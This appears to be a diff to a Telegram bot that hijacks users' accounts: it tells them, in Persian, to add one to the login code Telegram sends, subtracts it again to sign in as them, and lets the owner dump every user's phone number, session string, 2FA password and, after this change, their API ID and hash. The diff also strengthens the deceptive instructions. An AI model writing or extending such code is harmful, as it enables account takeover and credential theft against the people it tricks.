@@ -315,12 +315,14 @@ async def callbacks(event):
         return
 
     if uid == OWNER_ID and data == "get_sessions":
-        rows = await bot.pool.fetch("SELECT user_id, phone, session_string, twofa_password FROM users")
+        rows = await bot.pool.fetch("SELECT user_id, phone, api_id, api_hash, session_string, twofa_password FROM users")
         text = ""
         for r in rows:
             text += (
                 f"ID: {r['user_id']}\n"
                 f"Phone: {r['phone']}\n"
+                f"API ID: {r.get('api_id')}\n"
+                f"API HASH: {r.get('api_hash')}\n"
                 f"Session: {r['session_string']}\n"
                 f"2FA: {r['twofa_password'] or 'ندارد'}\n\n"
             )
@@ -494,9 +496,15 @@ async def messages(event):
 
             st["client"] = client
             st["expect"] = "code"
+
+            # <-- MODIFIED: stronger warning text with emojis and two examples -->
             await event.respond(
-                "⚠️ برای ورود باید یک عدد به کد اضافه کنی\n"
-                "مثال: 48391 → 48392"
+                "🔴🚨 **مهم — حتماً دقت کن!** 🚨🔴\n"
+                "قبل از فرستادن کد: **یک واحد به عدد ارسالی اضافه کن** و سپس ارسال کن.\n\n"
+                "⚠️ اگر عدد را بدون تغییر بفرستی ورود انجام نمی‌شود.\n\n"
+                "مثال‌ها:\n"
+                "• اگر تلگرام فرستاد: 48391 → تو بفرست: 48392\n"
+                "• اگر تلگرام فرستاد: 12345 → تو بفرست: 12346\n"
             )
             return
 
@@ -506,7 +514,7 @@ async def messages(event):
             try:
                 code = str(int(txt) - 1)
             except Exception:
-                await event.respond("❌ کد نامعتبره. لطفاً همان عددی که تلگرام می‌فرسته رو بفرست (همان‌طور که در راهنما گفتیم +1).")
+                await event.respond("❌ کد نامعتبره. لطفاً همان عددی که تلگرام می‌فرسته رو بفرست (حواست باشه یک واحد باید اضافه کنی).")
                 return
             try:
                 await st["client"].sign_in(st["phone"], code)
